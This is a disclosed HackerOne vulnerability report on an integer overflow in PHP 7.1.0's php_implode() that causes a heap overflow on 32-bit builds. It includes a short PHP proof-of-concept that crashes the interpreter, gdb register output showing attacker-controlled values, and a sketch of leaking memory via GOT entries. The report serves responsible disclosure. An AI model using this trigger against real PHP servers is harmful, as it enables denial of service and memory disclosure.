# An integer overflow bug in php_implode() could lead heap overflow, make PHP to crash

## Report Details
- **Report ID**: 113120
- **URL**: https://hackerone.com/reports/113120
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-01-27T21:57:52.867Z
- **Disclosed**: 2019-11-12T09:38:12.878Z

## Reporter
- **Username**: blue9057
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Description
-----------------
A heap overflow vulnerability can be triggered by
an integer overflow vulnerability,
which exists in PHP-7.1.0 due to missing overflow check
in a function php_implode() in ext/standard/string.c

I believe this could lead memory leak to the string if
carefully exploited with using global addresses
in the binary (e.g., GOT entries, heap addresses, etc.).

The bug happens on the line of ext/standard/string.c:1249,
upon calling zend_string_alloc().
Both %eax and %ecx can be controllable by the exploit.

str = zend_string_alloc(len + (numelems - 1) * ZSTR_LEN(delim), 0);

This is only triggered in 32bit machines.

PoC Exploit
-----------------
<?php
  $arr = [];
  for($i=0;$i<65536; ++$i) {
     $arr[$i]= "aa";
  }
  $text1 = str_repeat("ABCD", 16384);
  // Changing ABCD into other values will alter %eax and %ecx.
  $str = implode($text1, $arr);
?>

# Run this script with php version over 7.0


Result
---------
[blue9057@ubuntu ~/exploit/php$] gdb `which php`
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/local/bin/php...done.
(gdb) r implode.php
Starting program: /usr/local/bin/php implode.php

Program received signal SIGSEGV, Segmentation fault.
php_implode (delim=delim@entry=0xb7401000, arr=arr@entry=0xb7a13160, return_value=return_value@entry=0xb7a13100) at /home/blue9057/php-src/ext/standard/string.c:1255
1255				cptr -= ZSTR_LEN(*strptr);
(gdb) i r
eax            0x44434241	1145258561
ecx            0x44434241	1145258561
edx            0xb7452004	-1220206588
ebx            0xb7452004	-1220206588
esp            0xbfffbf80	0xbfffbf80
ebp            0xcccccccd	0xcccccccd
esi            0xb7451fe4	-1220206620
edi            0xb7442004	-1220272124
eip            0x827f0d8	0x827f0d8 <php_implode+440>
eflags         0x10206	[ PF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) r -v
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/local/bin/php -v
PHP 7.1.0-dev (cli) (built: Jan 24 2016 20:39:41) ( NTS )
Copyright (c) 1997-2016 The PHP Group
Zend Engine v3.1.0-dev, Copyright (c) 1998-2016 Zend Technologies
[Inferior 1 (process 3607) exited normally]
(gdb)


The attacker can control both %eax & %ecx for the arbitrary value.
The instruction is on moving the content at memory pointed by $eax to the memory address at $edx.
If it is carefully controlled, that copy of string operation can applied over a GOT addresses or sensitive areas to leak the data into PHP string variable.


## Attachments
No attachments
